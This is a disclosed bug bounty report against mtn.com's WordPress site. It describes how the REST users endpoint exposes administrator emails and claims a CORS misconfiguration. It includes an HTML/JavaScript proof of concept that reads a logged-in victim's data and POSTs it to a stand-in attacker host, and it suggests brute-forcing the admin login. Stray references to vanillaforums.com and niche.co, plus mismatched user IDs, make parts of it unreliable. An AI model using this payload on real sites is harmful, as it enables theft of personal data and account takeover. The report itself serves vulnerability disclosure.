# Unauthorized access to PII leads to Administrator account Takeover

## Report Details
- **Report ID**: 2450685
- **URL**: https://hackerone.com/reports/2450685
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2024-04-06T22:17:41.520Z
- **Disclosed**: 2025-02-22T15:48:49.662Z

## Reporter
- **Username**: h0w
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
This vulnerability is present in the `wp-json/wp/v2/users/15` file located in the wordpress directory endpoints. This flaw arises from insufficient restrictions placed on the list of post authors, which can be exploited by remote attackers to obtain sensitive information through wp/v2/users/15 requests attackers can obtain sensitive information in the form of email addresses (PII Leaks) and will be used in `wp-login` to send forget password or brute-force password requests.

**Descriptions:**
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page CORS misconfiguration is found on vanillaforums.com as `Access-Control-Allow-Credentials: true`.

**Platform(s) Affected: [website]**
https://www.mtn.com/wp-json/wp/v2/users/15

## Steps To Reproduce:
  1. Navigate visit hostname or directory on https:\/\/www.mtn.com\/wp-json\/wp\/v2\/users\/9
  1. Intercept request to `burp-suite` and you will see unauthenticated APIs `administrator_login` email address exposed

{F3171358}

  3. copy this scripts and save file as `.html` and open in our browsers 

```html
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal administrator PII data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://burpcollaborator-intruder-evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.mtn.com/wp-json/wp/v2/users/15", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
{F3171366}


## Supporting Material/References:
  * It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.
  * It's also possible to create a rewrite rule on `.htaccess` (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: "^.rest_route=/wp-json/wp/v2/users/15") to a Not Found (404) or a Default Page.

## Impact

1. Attacker get sensitive information PII Leaks (email adress)
 1. Attacker can brute-force the password use the valid administrator login
 1. CORS Misconfiguration, could lead to disclosure of sensitive information
 * Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
 * This website using Wordpress , so developer forget to enable authenticator in the APIs that can view information of admin user. By access to this link, attacker can get `username` and `email_address` and other information of user admin.

## Attachments
- image.png
- CORS.gif
